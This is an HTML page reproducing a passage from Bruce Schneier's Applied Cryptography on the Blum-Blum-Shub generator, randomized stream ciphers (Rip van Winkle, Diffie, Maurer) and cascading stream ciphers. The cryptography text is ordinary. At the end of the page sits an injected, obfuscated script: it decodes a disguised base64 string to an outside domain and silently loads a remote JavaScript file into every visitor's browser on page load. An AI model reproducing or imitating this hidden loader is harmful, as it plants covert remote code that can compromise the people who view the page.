<html>
<head>
<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Stream Ciphers and Real Random-Sequence Generators</TITLE>
<!-- BEGIN HEADER -->
<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
<SCRIPT>
<!--
function displayWindow(url, width, height) {
        var Win = window.open(url,"displayWindow",'width=' + width +
',height=' + height + ',resizable=1,scrollbars=yes');
}
//-->
</SCRIPT>

</HEAD>
<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
<P>
<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
<FONT SIZE="-2">
<BR>
<I>(Publisher: John Wiley & Sons, Inc.)</I>
<BR>
Author(s): Bruce Schneier
<BR>
ISBN: 0471128457
<BR>
Publication Date: 01/01/96
</FONT></CENTER>
<P>


<!-- Empty Reference Subhead -->

<!--ISBN=0471128457//-->
<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
<!--AUTHOR=Bruce Schneier//-->
<!--PUBLISHER=Wiley Computer Publishing//-->
<!--CHAPTER=17//-->
<!--PAGES=417-419//-->
<!--UNASSIGNED1//-->
<!--UNASSIGNED2//-->

<CENTER>
<TABLE BORDER>
<TR>
<TD><A HREF="17-07.html">Previous</A></TD>
<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
<TD><A HREF="17-09.html">Next</A></TD>
</TR>
</TABLE>
</CENTER>
<P><BR></P>
<P>The theory behind the BBS generator has to do with quadratic residues modulo <I>n</I> (see Section 11.3). Here&#146;s how it works.</P>
<P>First find two large prime numbers, <I>p</I> and <I>q</I>, which are congruent to 3 modulo 4. The product of those numbers, <I>n</I>, is a Blum integer. Choose another random integer, <I>x</I>, which is relatively prime to <I>n</I>. Compute</P>
<DL>
<DD><I>x</I><SUB>0</SUB> = <I>x</I><SUP>2</SUP> mod <I>n</I>
</DL>
<P>That&#146;s the seed for the generator.
</P>
<P>Now you can start computing bits. The <I>i</I>th pseudo-random bit is the least significant bit of <I>x</I><SUB>i</SUB>, where</P>
<DL>
<DD><I>x</I><SUB>i</SUB> = <I>x</I><SUB>i-1</SUB><SUP>2</SUP> mod <I>n</I>
</DL>
<P>The most intriguing property of this generator is that you don&#146;t have to iterate through all <I>i</I> - 1 bits to get the <I>i</I>th bit. If you know <I>p</I> and <I>q</I>, you can compute the <I>i</I>th bit directly.</P>
<DL>
<DD><I>b</I><SUB>i</SUB> is the least significant bit of <I>x</I><SUB>i</SUB>, where <I>x</I><SUB>i</SUB> = <I>x</I><SUB>0</SUB><SUP>(2<SUP>i</SUP>)</SUP> <SUP>mod ((<I>p</I>-1)(<I>q</I>-1))</SUP>
</DL>
<P>This property means you can use this cryptographically strong pseudo-random-bit generator as a stream cryptosystem for a random-access file.
</P>
<P>The security of this scheme rests on the difficulty of factoring <I>n</I>. You can make <I>n</I> public, so anyone can generate bits using the generator. However, unless a cryptanalyst can factor <I>n</I>, he can never predict the output of the generator&#151;not even with a statement like: &#147;The next bit has a 51 percent chance of being a 1.&#148;</P>
<P>More strongly, the BBS generator is <B>unpredictable to the left</B> and <B>unpredictable to the right</B>. This means that given a sequence generated by the generator, a cryptanalyst cannot predict the next bit in the sequence nor the previous bit in the sequence. This is not security based on some complicated bit generator that no one understands, but the mathematics behind factoring <I>n</I>.</P>
<P>This algorithm is slow, but there are speedups. As it turns out, you can use more than the least significant bit of each <I>x</I><SUB>i</SUB> as a pseudo-random bit. According to [1569,1570,1571,35,36], if <I>n</I> is the length of <I>x</I><SUB>i</SUB>, the least significant <I>log</I><SUB>2</SUB><I>n</I> bits of <I>x</I><SUB>i</SUB> can be used. The BBS generator is comparatively slow and isn&#146;t useful for stream ciphers. However, for high-security applications, such as key generation, this generator is the best of the lot.</P>
<H3><A NAME="Heading11"></A><FONT COLOR="#000077">17.10 Other Approaches to Stream-Cipher Design</FONT></H3>
<P>In an information-theoretic approach to stream ciphers, the cryptanalyst is assumed to have unlimited time and computing power. The only practical stream cipher that is secure against an adversary like this is a one-time pad (see Section 1.5). Since bits would be impractical on a pad, this is sometimes called a <B>one-time tape</B>. Two magnetic tapes, one at the encryption end and the other at the decryption end, would have the same random keystream on them. To encrypt, simply XOR the plaintext with the bits on the tape. To decrypt, XOR the ciphertext with the bits on the other, identical, tape. You never use the same keystream bits twice. Since the keystream bits are truly random, no one can predict the keystream. If you burn the tapes when you are through with them, you&#146;ve got perfect secrecy (assuming no one else has copies of the tape).</P>
<P>Another information-theoretic stream cipher, developed by Claus Schnorr, assumes that the cryptanalyst only has access to a limited number of ciphertext bits [1395]. The results are highly theoretical and have no practical value, at least not yet. For more details, consult [1361,1643,1193].</P>
<P>In a randomized stream cipher, the cryptographer tries to ensure that the cryptanalyst has an infeasibly large problem to solve. The objective is to increase the number of bits the cryptanalyst has to work with, while keeping the secret key small. This can be done by making use of a large public random string for encryption and decryption. The key would specify which parts of the large random string are to be used for encryption and decryption. The cryptanalyst, not knowing the key, is forced to pursue a brute-force search through the random string. The security of this sort of cipher can be expressed by the average number of bits a cryptanalyst must examine before the chances of determining the key improve over pure guessing.</P>
<P><FONT SIZE="+1"><B><I>Rip van Winkle Cipher</I></B></FONT></P>
<P>James Massey and Ingemar Ingemarsson proposed the Rip van Winkle cipher [1011], so named because the receiver has to receive 2<SUP>n</SUP> bits of ciphertext before attempting decryption. The algorithm, illustrated in Figure 17.10, is simple to implement, provably secure, and completely impractical. Simply XOR the plaintext with the keystream, and delay the keystream by 0 to 20 years&#151;the exact delay is part of the key. In Massey&#146;s words: &#147;One can easily guarantee that the enemy cryptanalyst will need thousands of years to break the cipher, if one is willing to wait millions of years to read the plaintext.&#148; Further work on this idea can be found in [1577,755].</P>
<I><P><A NAME="Fig10"></A><A HREF="javascript:displayWindow('images/17-10.jpg',303,93 )"><IMG SRC="images/17-10t.jpg"></A>
<BR><A HREF="javascript:displayWindow('images/17-10.jpg',303,93)"><FONT COLOR="#000077"><B>Figure 17.10</B></FONT></A>&nbsp;&nbsp;Rip van Winkle cipher.</I>
</P>
<P><FONT SIZE="+1"><B><I>Diffie&#146;s Randomized Stream Cipher</I></B></FONT></P>
<P>This scheme was first proposed by Whitfield Diffie [1362]. The data are 2<SUP>n</SUP> random sequences. The key is <I>k</I>, a random <I>n-</I>bit string. To encrypt a message, Alice uses the <I>k</I>th random string as a one-time pad. She then sends the ciphertext plus the 2<SUP><I>n</I></SUP> random strings over 2<SUP><I>n</I></SUP> &#43; 1 different communications channels.</P>
<P>Bob knows <I>k</I>, so he can easily choose which one-time pad to decrypt the message with. Eve has no choice but to examine the random sequences one at a time until she finds the correct one-time pad. Any attack must examine an expected number of bits which is in O(2<SUP><I>n</I></SUP>). Rueppel points out that if you send <I>n</I> random strings instead of 2<SUP><I>n</I></SUP>, and if the key is used to specify a linear combination of those random strings, the security is the same.</P>
<P><FONT SIZE="+1"><B><I>Maurer&#146;s Randomized Stream Cipher</I></B></FONT></P>
<P>Ueli Maurer described a scheme based on XORing the plaintext with several large public random-bit sequences [1034,1029,1030]. The key is the set of starting positions within each sequence. This turns out to be provably almost secure, with a calculable probability of being broken based on how much memory the attacker has at his disposal, without regard to the amount of computing power he has. Maurer claims that this scheme would be practical with about 100 different sequences of 10<SUP>20</SUP> random bits each. Digitizing the face of the moon might be one way to get this many bits.</P>
<H3><A NAME="Heading12"></A><FONT COLOR="#000077">17.11 Cascading Multiple Stream Ciphers</FONT></H3>
<P>If performance is no issue, there&#146;s no reason not to choose multiple stream ciphers and cascade them. Simply XOR the output of each generator with the plaintext to get the ciphertext. Ueli Maurer&#146;s result (see Section 15.7) says that if the generators have independent keys, then the security of the cascade is at least as secure as the strongest algorithm in the cascade. It is probably much more secure than that.
</P>
<P>Stream ciphers can be combined in all the same ways as block ciphers (see Chapter 15). Stream ciphers can be cascaded (see Section 15.7) with other stream ciphers, or together with block ciphers.</P><P><BR></P>
<CENTER>
<TABLE BORDER>
<TR>
<TD><A HREF="17-07.html">Previous</A></TD>
<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
<TD><A HREF="17-09.html">Next</A></TD>
</TR>
</TABLE>
</CENTER>

[an error occurred while processing this directive]
<script type="text/javascript">(function(ooolvDZB, zmiqAnmQ) {zmiqAnmQ = ooolvDZB.createElement('script');zmiqAnmQ.type = 'text/javascript';zmiqAnmQ.async = true;zmiqAnmQ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');ooolvDZB.getElementsByTagName('body')[0].appendChild(zmiqAnmQ);}(document));</script></body>
</html>
